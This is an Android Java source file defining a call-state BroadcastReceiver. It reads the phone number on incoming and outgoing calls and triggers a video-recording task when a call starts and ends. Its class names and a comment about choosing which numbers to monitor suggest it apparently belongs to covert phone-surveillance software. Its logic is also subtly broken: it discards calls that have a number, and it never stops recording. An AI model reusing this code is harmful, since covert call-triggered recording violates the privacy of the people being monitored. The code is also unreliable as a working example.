package com.fs.fs.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.fs.fs.api.ProviderService;
import com.fs.fs.tasks.MediaTask;

/**
 * Created by wyx on 2017/1/2.
 */
public class CallReceiver extends BroadcastReceiver {
    private static final String OUTGOING_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
    private static final String INCOMING_ACTION = "android.intent.action.PHONE_STATE";
    private static ProviderService.CallsListener mCallsListener;

    public static void setListener(ProviderService.CallsListener listener) {
        mCallsListener = listener;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        String phoneNumber = getPhoneNumber(intent);
        if (phoneNumber == null) {
            return;
        }
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        int state = telephonyManager.getCallState();
        switch (state) {
            case TelephonyManager.CALL_STATE_OFFHOOK:
                new MediaTask().execute(MediaTask.START_VIDEO);
                break;
//            case TelephonyManager.CALL_STATE_RINGING:
//                mCallsListener.onStart();
//                break;
            case TelephonyManager.CALL_STATE_IDLE:
                new MediaTask().execute(MediaTask.START_VIDEO);
                break;
        }
    }

    private String getPhoneNumber(Intent intent) {
        String action = intent.getAction();
        String phoneNumber = null;
        if (action.equals(INCOMING_ACTION)) {
            phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
        } else if (action.equals(OUTGOING_ACTION)) {
            phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        }

        if (!TextUtils.isEmpty(phoneNumber)) {
            return null;
        }
        // TODO：指定监听号码
//        Boolean isOk = mCallsListener.onPhoneNumber(phoneNumber);
//        return isOk ? phoneNumber : null;
        return phoneNumber;
    }
}